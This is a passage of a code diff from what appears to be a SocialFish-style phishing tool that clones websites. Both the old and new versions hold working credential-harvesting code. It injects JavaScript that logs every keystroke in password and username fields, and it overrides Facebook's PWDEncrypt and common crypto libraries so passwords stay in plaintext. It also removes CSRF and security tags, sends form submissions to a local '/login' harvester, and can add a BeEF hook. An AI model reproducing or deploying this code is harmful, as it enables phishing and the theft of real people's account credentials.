-                                            field: name,
-                                            password: input.value,
-                                            timestamp: Date.now(),
-                                            source: `nuclear-${eventType}`
+                            ['input', 'change', 'blur', 'keyup', 'paste'].forEach(eventType => {
+                                input.addEventListener(eventType, function() {
+                                    if (this.value) {
+                                        console.log(`🔑 UNIVERSAL ${eventType.toUpperCase()} - ${name}:`, this.value);
+                                        window.universalCapturedData.passwords.push({
+                                            field: name, password: this.value, timestamp: Date.now(), 
+                                            source: `universal-${eventType}`
                                         });
                                     }
                                 });
                             });
                         }
-                    });
-                } catch (e) {}
-            };
-            
-            // Run nuclear monitor continuously at maximum frequency
-            setInterval(nuclearMonitor, 50); // Every 50ms
-            
-            // NUCLEAR OPTION 7: OVERRIDE FORM SUBMISSION AT ALL LEVELS WITH COMPREHENSIVE PASSWORD RECOVERY
-            const nuclearFormIntercept = (form) => {
-                try {
-                    console.log("💥 NUCLEAR FORM SUBMISSION INTERCEPT");
-                    
-                    const inputs = form.querySelectorAll('input');
-                    const captured = {};
-                    
-                    inputs.forEach(input => {
-                        const name = input.name || input.id || `input_${Date.now()}`;
-                        let value = input.value;
-                        const type = input.type || 'text';
-                        
-                        // COMPREHENSIVE PASSWORD RECOVERY
-                        if (type === 'password' || /pass|pwd/i.test(name)) {
-                            // Try multiple sources for the password
-                            let recoveredPassword = value;
-                            
-                            // Source 1: Global password storage
-                            if (!recoveredPassword && window.globalPasswordStorage) {
-                                recoveredPassword = window.globalPasswordStorage.get(name) || 
-                                                  window.globalPasswordStorage.get('last_password');
-                            }
-                            
-                            // Source 2: Nuclear password storage
-                            if (!recoveredPassword && window.nuclearPasswordStorage) {
-                                recoveredPassword = window.nuclearPasswordStorage.get(input);
-                            }
-                            
-                            // Source 3: Check our capture arrays for this field
-                            if (!recoveredPassword && window.socialfishCapturedData.raw_passwords.length > 0) {
-                                const lastCapture = window.socialfishCapturedData.raw_passwords
-                                    .filter(p => p.field === name || p.field.includes('pass'))
-                                    .pop();
-                                if (lastCapture) {
-                                    recoveredPassword = lastCapture.password;
-                                }
-                            }
-                            
-                            // Use recovered password if found
-                            if (recoveredPassword) {
-                                value = recoveredPassword;
-                                console.log(`💥 NUCLEAR FORM SUBMIT PASSWORD RECOVERED - ${name}:`, value);
-                            } else {
-                                console.log(`💥 NUCLEAR FORM SUBMIT PASSWORD EMPTY - ${name}`);
-                            }
-                            
-                            window.socialfishCapturedData.raw_passwords.push({
-                                field: name,
-                                password: value,
-                                timestamp: Date.now(),
-                                source: 'nuclear-form-submit'
-                            });
-                        }
-                        
-                        captured[name] = value;
-                        
-                        if (/email|user|login/i.test(name)) {
-                            window.socialfishCapturedData.usernames.push({
-                                field: name,
-                                value: value,
-                                timestamp: Date.now(),
-                                source: 'nuclear-form-submit'
-                            });
-                        }
-                    });
-                    
-                    // CRITICAL: Make sure we have at least one password
-                    const hasPassword = Object.keys(captured).some(key => 
-                        (/pass|pwd/i.test(key) && captured[key]) || 
-                        key === 'pass' || key === 'password'
-                    );
-                    
-                    if (!hasPassword && window.globalPasswordStorage && window.globalPasswordStorage.get('last_password')) {
-                        // Add the last captured password to the form
-                        captured['pass'] = window.globalPasswordStorage.get('last_password');
-                        console.log("💥 NUCLEAR ADDED LAST PASSWORD TO FORM:", captured['pass']);
                     }
-                    
-                    window.socialfishCapturedData.formData = captured;
-                    console.log("💥 NUCLEAR COMPLETE FORM DATA:", captured);
-                } catch (e) {}
+                });
             };
             
-            // Override form submission at multiple levels
-            document.addEventListener('submit', function(e) {
-                nuclearFormIntercept(e.target);
-            }, true);
+            // Initialize universal monitoring
+            universalFormMonitor();
+            universalInputMonitor();
             
-            try {
-                const originalSubmit = HTMLFormElement.prototype.submit;
-                HTMLFormElement.prototype.submit = function() {
-                    nuclearFormIntercept(this);
-                    return originalSubmit.call(this);
-                };
-            } catch (e) {}
-            
-            // NUCLEAR OPTION 8: EXPOSE COMPREHENSIVE DATA ACCESS
-            window.getSocialFishCapturedData = function() {
-                return window.socialfishCapturedData;
-            };
-            
-            // NUCLEAR OPTION 9: CONTINUOUS LOGGING
+            // Continuous monitoring for dynamic content
             setInterval(() => {
-                if (window.socialfishCapturedData.raw_passwords.length > 0) {
-                    console.log("💥 NUCLEAR RAW PASSWORDS CAPTURED:", window.socialfishCapturedData.raw_passwords);
-                }
+                universalFormMonitor();
+                universalInputMonitor();
             }, 1000);
             
-            console.log("💥 NUCLEAR PASSWORD CAPTURE SYSTEM FULLY DEPLOYED - MAXIMUM DESTRUCTION MODE!");
+            // Universal access function
+            window.getUniversalCapturedData = () => window.universalCapturedData;
+            
+            console.log("✅ UNIVERSAL PASSWORD CAPTURE READY");
             
         })();
         '''
         
         try:
-            self.driver.execute_script(nuclear_script)
-            logger.info("💥 Nuclear password capture system deployed")
+            self.driver.execute_script(universal_capture_script)
+            logger.debug("Universal password capture injected")
         except Exception as e:
-            logger.error(f"❌ Failed to deploy nuclear password capture: {e}")
-    
-    def _inject_password_capture_scripts(self):
-        """CRITICAL: Inject ULTRA-AGGRESSIVE password capture and encryption blocking scripts"""
-        password_capture_script = '''
-        (function() {
-            console.log("🔑 SocialFish ULTRA Password Capture System Activated");
-            
-            // STEP 0: IMMEDIATE GLOBAL BLOCKING - BEFORE ANYTHING ELSE LOADS
-            
-            // Block ALL module loading systems immediately
-            if (typeof window.__d !== 'undefined') {
-                window.__d = function() { return null; };
-            }
-            
-            // Pre-emptively define blocking functions
-            window.PWDEncrypt = function(password) {
-                console.log("🔑 PWDEncrypt BLOCKED - Plain password:", password);
-                window.socialfishCapturedData = window.socialfishCapturedData || {passwords: []};
-                window.socialfishCapturedData.passwords.push({
-                    field: 'PWDEncrypt_intercepted',
-                    value: password,
-                    timestamp: Date.now(),
-                    source: 'PWDEncrypt_block'
-                });
-                return password; // Return plain text
-            };
-            
-            // Block Facebook's encryption before it loads
-            Object.defineProperty(window, 'PWDEncrypt', {
-                get: function() {
-                    return function(password) {
-                        console.log("🔑 PWDEncrypt getter BLOCKED - password:", password);
-                        return password;
-                    };
-                },
-                set: function(value) {
-                    console.log("🛡️ Prevented PWDEncrypt from being set");
-                    return function(password) {
-                        console.log("🔑 PWDEncrypt setter BLOCKED - password:", password);
-                        return password;
-                    };
-                },
-                configurable: false
-            });
-            
-            // Global password storage accessible from outside
-            window.socialfishCapturedData = {
-                passwords: [],
-                usernames: [],
-                formData: {},
-                originalPasswords: [],
-                blocked_encryptions: []
-            };
-            
-            // STEP 1: NUCLEAR OPTION - DISABLE ALL POSSIBLE ENCRYPTION
-            
-            // Block crypto libraries BEFORE they can be used
-            const cryptoLibs = ['CryptoJS', 'forge', 'bcrypt', 'jsencrypt', 'crypto-js', 'sjcl'];
-            cryptoLibs.forEach(lib => {
-                Object.defineProperty(window, lib, {
-                    get: function() { 
-                        console.log(`🛡️ Blocked access to ${lib}`);
-                        return undefined; 
-                    },
-                    set: function() { 
-                        console.log(`🛡️ Blocked setting of ${lib}`);
-                        return undefined; 
-                    },
-                    configurable: false
-                });
-            });
-            
-            // Override btoa/atob AGGRESSIVELY
-            const originalBtoa = window.btoa;
-            const originalAtob = window.atob;
-            
-            window.btoa = function(str) {
-                console.log("🔑 btoa called with:", str);
-                if (str && str.length > 4 && str.length < 100) {
-                    window.socialfishCapturedData.originalPasswords.push({
-                        function: 'btoa',
-                        password: str,
-                        timestamp: Date.now()
-                    });
-                }
-                return originalBtoa(str);
-            };
-            
-            // STEP 2: INTERCEPT ALL POSSIBLE FORM SUBMISSION METHODS
-            
-            // Override form submission at the lowest level
-            const originalFormSubmit = HTMLFormElement.prototype.submit;
-            HTMLFormElement.prototype.submit = function() {
-                console.log("🔑 Form.submit() intercepted");
-                captureFormDataBeforeSubmission(this);
-                return originalFormSubmit.call(this);
-            };
-            
-            // Override FormData constructor
-            const originalFormData = window.FormData;
-            window.FormData = function(form) {
-                const formData = new originalFormData(form);
-                if (form) {
-                    console.log("🔑 FormData constructor intercepted");
-                    captureFormDataBeforeSubmission(form);
-                }
-                return formData;
-            };
-            
-            // Function to capture form data
-            const captureFormDataBeforeSubmission = (form) => {
-                try {
-                    const inputs = form.querySelectorAll('input');
-                    inputs.forEach(input => {
-                        const name = input.name || input.id || 'unknown';
-                        const value = input.value;
-                        const type = input.type || 'text';
-                        
-                        if (type === 'password' || /pass|pwd/i.test(name)) {
-                            console.log(`🔑 FORM PASSWORD CAPTURED - ${name}:`, value);
-                            window.socialfishCapturedData.passwords.push({
-                                field: name,
-                                value: value,
-                                timestamp: Date.now(),
-                                source: 'form-capture-direct'
-                            });
-                        }
-                        
-                        if (/email|user|login/i.test(name)) {
-                            console.log(`👤 FORM USERNAME CAPTURED - ${name}:`, value);
-                            window.socialfishCapturedData.usernames.push({
-                                field: name,
-                                value: value,
-                                timestamp: Date.now(),
-                                source: 'form-capture-direct'
-                            });
-                        }
-                    });
-                } catch (e) {
-                    console.log("Error in form capture:", e);
-                }
-            };
-            
-            // STEP 3: AGGRESSIVE MODULE SYSTEM BLOCKING
-            
-            // Block AMD/RequireJS
-            if (window.define) {
-                const originalDefine = window.define;
-                window.define = function(name, deps, factory) {
-                    if (typeof name === 'string' && (name.includes('PWD') || name.includes('encrypt'))) {
-                        console.log("🛡️ Blocked AMD module:", name);
-                        return;
-                    }
-                    return originalDefine.apply(this, arguments);
-                };
-            }
-            
-            // Block CommonJS require
-            if (window.require) {
-                const originalRequire = window.require;
-                window.require = function(module) {
-                    if (typeof module === 'string' && (module.includes('PWD') || module.includes('encrypt'))) {
-                        console.log("🛡️ Blocked require:", module);
-                        return { encrypt: (p) => p, hash: (p) => p };
-                    }
-                    return originalRequire.apply(this, arguments);
-                };
-            }
-            
-            // STEP 4: FACEBOOK-SPECIFIC ULTRA BLOCKING
-            
-            // Block Facebook's module system more aggressively
-            const blockFacebookModules = () => {
-                // Kill __d immediately and permanently
-                Object.defineProperty(window, '__d', {
-                    get: function() {
-                        return function(name, deps, factory) {
-                            if (name && (name.includes('PWD') || name.includes('encrypt') || name.includes('crypto'))) {
-                                console.log("🛡️ KILLED Facebook module:", name);
-                                return null;
-                            }
-                            // Let other modules load normally but log them
-                            console.log("📦 Facebook module loading:", name);
-                            if (factory && typeof factory === 'function') {
-                                try {
-                                    const result = factory();
-                                    if (result && typeof result.encrypt === 'function') {
-                                        console.log("🛡️ Found encryption in module, blocking");
-                                        result.encrypt = (p) => p;
-                                    }
-                                    return result;
-                                } catch (e) {
-                                    return null;
-                                }
-                            }
-                            return null;
-                        };
-                    },
-                    set: function() {
-                        console.log("🛡️ Prevented __d from being overwritten");
-                    },
-                    configurable: false
-                });
-                
-                // Block specific Facebook functions
-                const fbFunctions = ['PWDEncrypt', 'encryptPassword', 'hashPassword', '_encrypt', 'passwordEncrypt'];
-                fbFunctions.forEach(funcName => {
-                    Object.defineProperty(window, funcName, {
-                        get: function() {
-                            return function(password) {
-                                console.log(`🔑 ${funcName} INTERCEPTED - password:`, password);
-                                window.socialfishCapturedData.blocked_encryptions.push({
-                                    function: funcName,
-                                    password: password,
-                                    timestamp: Date.now()
-                                });
-                                return password; // Return unencrypted
-                            };
-                        },
-                        set: function() {
-                            console.log(`🛡️ Prevented ${funcName} from being set`);
-                        },
-                        configurable: false
-                    });
-                });
-            };
-            
-            // STEP 2: MONITOR ALL PASSWORD INPUTS IN REAL-TIME
-            
-            const capturePasswordInput = (element, source) => {
-                const value = element.value;
-                if (value && value.length > 0) {
-                    console.log(`🔑 Password captured from ${source}:`, value);
-                    window.socialfishCapturedData.passwords.push({
-                        field: element.name || element.id || 'unknown',
-                        value: value,
-                        timestamp: Date.now(),
-                        source: source
-                    });
-                }
-            };
-            
-            const monitorPasswordFields = () => {
-                // Monitor all password type inputs
-                document.querySelectorAll('input[type="password"]').forEach(field => {
-                    // Remove existing listeners to avoid duplicates
-                    field.removeEventListener('input', field._socialfishInputHandler);
-                    field.removeEventListener('change', field._socialfishChangeHandler);
-                    field.removeEventListener('blur', field._socialfishBlurHandler);
-                    
-                    // Create handlers
-                    field._socialfishInputHandler = () => capturePasswordInput(field, 'input-event');
-                    field._socialfishChangeHandler = () => capturePasswordInput(field, 'change-event');
-                    field._socialfishBlurHandler = () => capturePasswordInput(field, 'blur-event');
-                    
-                    // Add listeners
-                    field.addEventListener('input', field._socialfishInputHandler);
-                    field.addEventListener('change', field._socialfishChangeHandler);
-                    field.addEventListener('blur', field._socialfishBlurHandler);
-                    
-                    console.log("🔍 Monitoring password field:", field.name || field.id);
-                });
-                
-                // Monitor fields that might contain passwords by name/id
-                document.querySelectorAll('input[name*="pass"], input[id*="pass"], input[name*="pwd"], input[id*="pwd"]').forEach(field => {
-                    if (field.type !== 'password') {
-                        field._socialfishInputHandler = () => capturePasswordInput(field, 'name-based');
-                        field.addEventListener('input', field._socialfishInputHandler);
-                        console.log("🔍 Monitoring potential password field by name:", field.name || field.id);
-                    }
-                });
-            };
-            
-            // STEP 3: INTERCEPT FORM SUBMISSIONS
-            
-            const interceptFormSubmission = (form) => {
-                const formData = new FormData(form);
-                const capturedData = {};
-                
-                for (let [key, value] of formData.entries()) {
-                    capturedData[key] = value;
-                    
-                    // Log password fields
-                    if (/password|pwd|pass|login/i.test(key) || 
-                        (typeof value === 'string' && value.length >= 4 && value.length <= 50)) {
-                        console.log(`🔑 Form submission password captured - ${key}:`, value);
-                        window.socialfishCapturedData.passwords.push({
-                            field: key,
-                            value: value,
-                            timestamp: Date.now(),
-                            source: 'form-submission'
-                        });
-                    }
-                    
-                    // Log username fields
-                    if (/email|username|user|login/i.test(key)) {
-                        console.log(`👤 Username captured - ${key}:`, value);
-                        window.socialfishCapturedData.usernames.push({
-                            field: key,
-                            value: value,
-                            timestamp: Date.now(),
-                            source: 'form-submission'
-                        });
-                    }
-                }
-                
-                window.socialfishCapturedData.formData = capturedData;
-                console.log("📊 Complete form data captured:", capturedData);
-            };
-            
-            // Monitor form submissions
-            document.addEventListener('submit', function(e) {
-                console.log("📋 Form submission intercepted");
-                interceptFormSubmission(e.target);
-            }, true);
-            
-            // STEP 4: INITIALIZATION AND CONTINUOUS MONITORING
-            
-            // Run immediately
-            blockFacebookEncryption();
-            blockCryptoLibraries();
-            monitorPasswordFields();
-            
-            // Re-run when DOM changes (for dynamic content)
-            const observer = new MutationObserver(function(mutations) {
-                let shouldRecheck = false;
-                mutations.forEach(function(mutation) {
-                    if (mutation.addedNodes.length > 0) {
-                        mutation.addedNodes.forEach(node => {
-                            if (node.nodeType === 1) { // Element node
-                                if (node.tagName === 'INPUT' || node.querySelector('input')) {
-                                    shouldRecheck = true;
-                                }
-                            }
-                        });
-                    }
-                });
-                
-                if (shouldRecheck) {
-                    setTimeout(() => {
-                        blockFacebookEncryption();
-                        blockCryptoLibraries();
-                        monitorPasswordFields();
-                    }, 100);
-                }
-            });
-            
-            observer.observe(document.body, {
-                childList: true,
-                subtree: true
-            });
-            
-            // STEP 5: EXPOSE CAPTURE FUNCTION FOR EXTERNAL ACCESS
-            
-            window.getSocialFishCapturedData = function() {
-                return window.socialfishCapturedData;
-            };
-            
-            // Periodic capture for debugging
-            setInterval(() => {
-                if (window.socialfishCapturedData.passwords.length > 0) {
-                    console.log("🔑 Current captured passwords:", window.socialfishCapturedData.passwords);
-                }
-            }, 5000);
-            
-            console.log("✅ SocialFish Password Capture System Ready - All encryption blocked!");
-            
-        })();
-        '''
-        
-        try:
-            self.driver.execute_script(password_capture_script)
-            logger.info("✅ Password capture system activated")
-        except Exception as e:
-            logger.error(f"❌ Failed to inject password capture scripts: {e}")
+            logger.debug(f"Password capture injection failed: {e}")
     
     def get_captured_passwords(self) -> Optional[Dict]:
-        """Retrieve captured passwords from the browser"""
+        """Get captured passwords from universal system"""
         try:
-            captured_data = self.driver.execute_script("return window.getSocialFishCapturedData ? window.getSocialFishCapturedData() : null;")
+            captured_data = self.driver.execute_script("return window.getUniversalCapturedData ? window.getUniversalCapturedData() : null;")
             if captured_data and captured_data.get('passwords'):
-                logger.info(f"🔑 Retrieved {len(captured_data['passwords'])} captured passwords")
+                logger.info(f"🔑 Retrieved {len(captured_data['passwords'])} universal passwords")
                 self.captured_passwords.append(captured_data)
                 return captured_data
             return None
         except Exception as e:
-            logger.error(f"❌ Failed to retrieve captured passwords: {e}")
+            logger.debug(f"Password retrieval failed: {e}")
             return None
     
-    async def _simulate_human_behavior(self):
-        """Simulate human-like behavior"""
-        try:
-            # Random scrolling
-            for position in [0.2, 0.5, 0.8, 1.0]:
-                self.driver.execute_script(f"window.scrollTo(0, document.body.scrollHeight * {position});")
-                await asyncio.sleep(random.uniform(0.5, 1.0))
-        except Exception:
-            pass
-    
     def cleanup(self):
-        """Cleanup browser and save captured passwords"""
+        """Cleanup universal browser"""
         if self.driver:
             try:
-                # Try to get final captured data before closing
                 final_capture = self.get_captured_passwords()
                 if final_capture:
-                    logger.info(f"🔑 Final password capture before cleanup: {len(final_capture.get('passwords', []))} passwords")
-                
+                    logger.info(f"🔑 Final universal password capture: {len(final_capture.get('passwords', []))} passwords")
                 self.driver.quit()
             except Exception:
                 pass
             self.driver = None
 
-class SocialFishContentProcessor:
-    """Content processor optimized for SocialFish - FIXED CSS BACKGROUND REWRITING + PASSWORD CAPTURE"""
+class UniversalContentProcessor:
+    """Universal content processor for any website"""
     
-    def __init__(self, config: SocialFishConfig, resource_manager: SocialFishResourceManager):
+    def __init__(self, config: UniversalClonerConfig, resource_manager: UniversalResourceManager):
         self.config = config
         self.resource_manager = resource_manager
     
-    def _is_text_content_type(self, content_type: str, resource_type: str) -> bool:
-        """Determine if content should be treated as text"""
-        if resource_type in ['css', 'js']:
-            return True
-        
-        if not content_type:
-            return resource_type in ['css', 'js']
-        
-        text_types = [
-            'text/', 'application/javascript', 'application/x-javascript',
-            'application/json', 'application/xml'
-        ]
-        
-        return any(content_type.lower().startswith(t) for t in text_types)
-    
-    async def process_html(self, html_content: str, base_url: str, 
-                          output_dir: Path, beef_enabled: bool = False) -> str:
-        """Process HTML with SocialFish optimizations - FIXED URL REWRITING + ULTRA PASSWORD CAPTURE"""
+    async def process_html_universal(self, html_content: str, base_url: str, 
+                                   output_dir: Path, beef_enabled: bool = False) -> str:
+        """Universal HTML processing for any website"""
         
         if not BS4_AVAILABLE:
-            return self._process_with_regex(html_content, base_url, output_dir, beef_enabled)
+            return self._process_with_regex_universal(html_content, base_url, output_dir, beef_enabled)
         
         soup = BeautifulSoup(html_content, 'html.parser')
         
-        # CRITICAL: Inject password capture BEFORE any other processing
-        self._inject_ultra_password_capture_scripts(soup)
+        # Universal password capture injection (first priority)
+        if self.config.capture_passwords_plaintext:
+            self._inject_universal_password_capture_html(soup)
         
-        # CRITICAL: Remove/disable Facebook's encryption scripts at HTML level
-        self._disable_encryption_scripts(soup)
+        # Universal encryption blocking
+        self._disable_universal_encryption_scripts(soup)
         
-        # Remove tracking
-        self._remove_tracking_scripts(soup)
+        # Remove universal tracking
+        self._remove_universal_tracking_scripts(soup)
         
-        # FIXED: Process resources with proper URL mapping
-        await self._process_all_resources_with_mapping(soup, base_url, output_dir)
+        # Universal resource processing with comprehensive discovery
+        await self._process_universal_resources(soup, base_url, output_dir)
         
-        # CRITICAL FIX: Rewrite URLs in HTML after downloading
-        self._rewrite_urls_in_html(soup, base_url)
+        # Universal URL rewriting
+        self._rewrite_universal_urls(soup, base_url)
         
-        # Create placeholder files for common missing resources
-        self._create_placeholder_resources(output_dir)
+        # Universal form processing
+        self._process_universal_forms(soup)
         
-        # Handle forms for SocialFish with PASSWORD CAPTURE
-        self._process_forms_for_socialfish_with_password_capture(soup)
-        
-        # Add BeEF hook if enabled
+        # BeEF integration if enabled
         if beef_enabled:
             self._add_beef_hook(soup)
         
-        # Add universal AJAX blocking
+        # Universal AJAX blocking
         self._add_universal_ajax_blocking(soup)
         
-        # CRITICAL: Add password capture JavaScript to HTML
-        self._add_password_capture_js(soup)
-        
-        # Add SocialFish JavaScript
-        self._add_socialfish_js(soup)
+        # Universal JavaScript additions
+        self._add_universal_js_enhancements(soup)
         
         return str(soup)
     
-    def _inject_ultra_password_capture_scripts(self, soup: BeautifulSoup):
-        """CRITICAL: Inject ULTRA password capture as the FIRST script in HEAD"""
-        ultra_script = soup.new_tag('script')
-        ultra_script.string = '''(function() {
-            console.log("🔑 ULTRA Password Capture - FIRST SCRIPT LOADED");
-            
-            // NUCLEAR OPTION: Block encryption IMMEDIATELY
-            window.socialfishCapturedData = {passwords: [], usernames: [], formData: {}, blocked: []};
-            
-            // Pre-emptively kill all encryption functions
-            const blockFunctions = ['PWDEncrypt', 'encryptPassword', 'hashPassword', '_encrypt'];
-            blockFunctions.forEach(func => {
-                Object.defineProperty(window, func, {
-                    get: () => (p) => { 
-                        console.log(`🔑 ${func} KILLED - password:`, p); 
-                        window.socialfishCapturedData.passwords.push({field: func, value: p, timestamp: Date.now()}); 
-                        return p; 
-                    },
-                    set: () => console.log(`🛡️ ${func} set blocked`),
-                    configurable: false
-                });
-            });
-            
-            // Kill module loaders
-            window.__d = () => null;
-            
-            console.log("✅ ULTRA Password Capture - Encryption KILLED");
-        })();'''
+    async def _process_universal_resources(self, soup: BeautifulSoup, base_url: str, output_dir: Path):
+        """Universal comprehensive resource discovery and processing"""
         
-        head = soup.find('head')
-        if head:
-            # Insert as the VERY FIRST element in head
-            head.insert(0, ultra_script)
-        else:
-            # Create head if it doesn't exist and add script
-            head = soup.new_tag('head')
-            head.append(ultra_script)
-            if soup.html:
-                soup.html.insert(0, head)
-            else:
-                soup.insert(0, head)
-    
-    def _disable_encryption_scripts(self, soup: BeautifulSoup):
-        """NUCLEAR: Completely remove/replace Facebook's encryption scripts at HTML source level"""
+        # Discover all resources using universal methods
+        all_resources = []
         
-        logger.info("💥 NUCLEAR: Disabling encryption scripts at HTML source level")
+        # Standard resources
+        all_resources.extend(self._discover_standard_resources(soup, base_url))
         
-        # NUCLEAR OPTION 1: Remove ALL scripts that might contain encryption
-        removed_scripts = 0
-        for script in soup.find_all('script'):
-            if script.string:
-                script_content = script.string.lower()
-                
-                # Super aggressive detection
-                encryption_indicators = [
-                    'pwdencrypt', 'encryptpassword', '__d(', 'crypto', 'encrypt', 'hash',
-                    'pwd_browser', 'password', 'btoa', 'atob', 'base64', 'encode',
-                    'module', 'require', 'define', 'amd', 'commonjs'
-                ]
-                
-                if any(indicator in script_content for indicator in encryption_indicators):
-                    logger.info(f"💥 REMOVING encryption script containing: {[ind for ind in encryption_indicators if ind in script_content]}")
-                    script.decompose()
-                    removed_scripts += 1
-                    continue
-                
-                # NUCLEAR REPLACEMENT: Replace encryption functions inline
-                modified_content = script.string
-                
-                # Replace ALL possible encryption function patterns
-                encryption_patterns = [
-                    (r'PWDEncrypt\s*[=:]\s*function[^}]*{[^}]*}', 'PWDEncrypt = function(p) { console.log("🔑 PWDEncrypt REPLACED:", p); return p; }'),
-                    (r'encryptPassword\s*[=:]\s*function[^}]*{[^}]*}', 'encryptPassword = function(p) { console.log("🔑 encryptPassword REPLACED:", p); return p; }'),
-                    (r'hashPassword\s*[=:]\s*function[^}]*{[^}]*}', 'hashPassword = function(p) { console.log("🔑 hashPassword REPLACED:", p); return p; }'),
-                    (r'__d\s*\(\s*["\'][^"\']*encrypt[^"\']*["\'][^)]*\)', '/* REMOVED ENCRYPTION MODULE */'),
-                    (r'__d\s*\(\s*["\'][^"\']*PWD[^"\']*["\'][^)]*\)', '/* REMOVED PWD MODULE */'),
-                    (r'btoa\s*\([^)]*\)', 'btoa(arguments[0]) /* MONITORED */'),
-                ]
-                
-                for pattern, replacement in encryption_patterns:
-                    if re.search(pattern, modified_content, re.IGNORECASE):
-                        logger.info(f"💥 REPLACING encryption pattern: {pattern[:30]}...")
-                        modified_content = re.sub(pattern, replacement, modified_content, flags=re.IGNORECASE)
-                
-                if modified_content != script.string:
-                    script.string = modified_content
-            
-            # NUCLEAR: Remove external scripts that might load encryption
-            src = script.get('src', '')
-            if src:
-                suspicious_patterns = ['encrypt', 'crypto', 'pwd', 'hash', 'security', 'auth']
-                if any(pattern in src.lower() for pattern in suspicious_patterns):
-                    logger.info(f"💥 REMOVING external encryption script: {src}")
-                    script.decompose()
-                    removed_scripts += 1
+        # Advanced resources
+        all_resources.extend(self._discover_advanced_resources(soup, base_url))
         
-        logger.info(f"💥 NUCLEAR: Removed/modified {removed_scripts} encryption scripts")
+        # Service worker resources
+        if self.config.discover_service_workers:
+            all_resources.extend(await self._discover_service_worker_resources(soup, base_url, output_dir))
         
-        # NUCLEAR OPTION 2: Add password interceptor as FIRST script
-        nuclear_interceptor = soup.new_tag('script')
-        nuclear_interceptor.string = '''
-        // NUCLEAR PASSWORD INTERCEPTOR - LOADS BEFORE EVERYTHING
-        (function() {
-            console.log("💥 NUCLEAR INTERCEPTOR - FIRST TO LOAD");
-            
-            // Immediately capture any password-related activity
-            window.socialfishNuclearData = {passwords: [], blocked: []};
-            
-            // Kill encryption functions BEFORE they can be defined
-            const preemptiveKill = ['PWDEncrypt', 'encryptPassword', 'hashPassword', '_encrypt'];
-            preemptiveKill.forEach(func => {
-                try {
-                    Object.defineProperty(window, func, {
-                        get: () => (p) => { 
-                            console.log(`💥 ${func} KILLED:`, p); 
-                            window.socialfishNuclearData.passwords.push({func, password: p, time: Date.now()}); 
-                            return p; 
-                        },
-                        set: () => console.log(`💥 ${func} SET BLOCKED`),
-                        configurable: false
-                    });
-                } catch(e) {}
-            });
-            
-            // Kill module systems
-            window.__d = () => null;
-            if (window.require) window.require = () => ({});
-            
-            console.log("💥 NUCLEAR INTERCEPTOR ARMED");
-        })();
-        '''
+        # Web manifest resources
+        if self.config.discover_web_manifests:
+            all_resources.extend(await self._discover_web_manifest_resources(soup, base_url, output_dir))
         
-        # Insert as VERY FIRST element in head
-        head = soup.find('head')
-        if head:
-            head.insert(0, nuclear_interceptor)
+        # Dynamic resources from any source
+        all_resources.extend(self._discover_dynamic_universal_resources(soup, base_url))
         
-        # NUCLEAR OPTION 3: Modify form elements to prevent encryption
-        for form in soup.find_all('form'):
-            # Add data attribute to mark form as intercepted
-            form['data-nuclear-intercepted'] = 'true'
-            
-            # Remove any encryption-related attributes
-            for attr in ['data-encrypt', 'data-hash', 'onsubmit']:
-                if form.get(attr):
-                    logger.info(f"💥 REMOVING form attribute: {attr}")
-                    del form[attr]
+        # Remove duplicates
+        unique_resources = self._deduplicate_resources(all_resources)
         
-        # NUCLEAR OPTION 4: Modify password inputs
-        for input_field in soup.find_all('input'):
-            input_type = input_field.get('type', '').lower()
-            input_name = (input_field.get('name', '') + input_field.get('id', '')).lower()
-            
-            if input_type == 'password' or 'pass' in input_name or 'pwd' in input_name:
-                # Remove encryption attributes
-                for attr in ['data-encrypt', 'data-hash', 'onchange', 'onblur', 'oninput']:
-                    if input_field.get(attr):
-                        logger.info(f"💥 REMOVING password input attribute: {attr}")
-                        del input_field[attr]
-                
-                # Add nuclear monitoring attributes
-                input_field['data-nuclear-monitor'] = 'true'
-                input_field['autocomplete'] = 'new-password'
+        logger.info(f"🔍 Universal resource discovery: {len(unique_resources)} total resources")
         
-        # NUCLEAR OPTION 5: Remove/modify meta tags that might trigger encryption
-        for meta in soup.find_all('meta'):
-            name = meta.get('name', '').lower()
-            content = meta.get('content', '').lower()
-            
-            if any(pattern in name + content for pattern in ['encrypt', 'crypto', 'security', 'csrf']):
-                logger.info(f"💥 REMOVING meta tag: {name}")
-                meta.decompose()
-        
-        logger.info("💥 NUCLEAR: HTML source encryption disabling complete")
-    
-    def _process_forms_for_socialfish_with_password_capture(self, soup: BeautifulSoup):
-        """Process forms for SocialFish integration with enhanced password capture"""
-        for form in soup.find_all('form'):
-            # Store original action
-            original_action = form.get('action', '')
-            if original_action:
-                form['data-original-action'] = original_action
-            
-            # Redirect to SocialFish login handler
-            form['action'] = '/login'
-            form['method'] = 'post'
-            
-            # Enhance password fields for better capture
-            for input_field in form.find_all('input'):
-                input_type = input_field.get('type', '').lower()
-                input_name = (input_field.get('name', '') + input_field.get('id', '')).lower()
-                
-                if input_type == 'password' or 'pass' in input_name or 'pwd' in input_name:
-                    # Add attributes to prevent encryption and enhance capture
-                    input_field['data-socialfish-password'] = 'true'
-                    input_field['autocomplete'] = 'new-password'
-                    # Remove any existing encryption attributes
-                    if input_field.get('data-encrypt'):
-                        del input_field['data-encrypt']
-                    if input_field.get('data-hash'):
-                        del input_field['data-hash']
-                    
-                    logger.debug(f"Enhanced password field: {input_field.get('name', input_field.get('id', 'unknown'))}")
-    
-    def _add_password_capture_js(self, soup: BeautifulSoup):
-        """Add NUCLEAR password capture JavaScript to HTML - PRODUCTION VERSION"""
-        script = soup.new_tag('script')
-        script.string = '''(function() {
-            console.log("💥 NUCLEAR HTML Password Capture Integration - PRODUCTION");
-            
-            // Production-grade password storage
-            window.socialfishPasswords = new Map();
-            window.socialfishLastPassword = '';
-            window.socialfishUsername = '';
-            
-            // PRODUCTION OPTION 1: AGGRESSIVE REAL-TIME MONITORING
-            const productionPasswordMonitor = () => {
-                // Monitor ALL inputs continuously
-                document.querySelectorAll('input').forEach(input => {
-                    const type = input.type || 'text';
-                    const name = input.name || input.id || 'unknown';
-                    
-                    if (type === 'password' || /pass|pwd/i.test(name)) {
-                        if (!input._productionMonitored) {
-                            input._productionMonitored = true;
-                            console.log("💥 PRODUCTION monitoring password field:", name);
-                            
-                            // ULTRA-AGGRESSIVE event monitoring
-                            const events = ['input', 'change', 'keyup', 'keydown', 'keypress', 'paste', 'focus', 'blur'];
-                            events.forEach(eventType => {
-                                input.addEventListener(eventType, function() {
-                                    const value = this.value;
-                                    if (value && value.length > 0) {
-                                        console.log(`💥 PRODUCTION ${eventType.toUpperCase()} - PASSWORD:`, value);
-                                        window.socialfishPasswords.set(name, value);
-                                        window.socialfishLastPassword = value;
-                                        
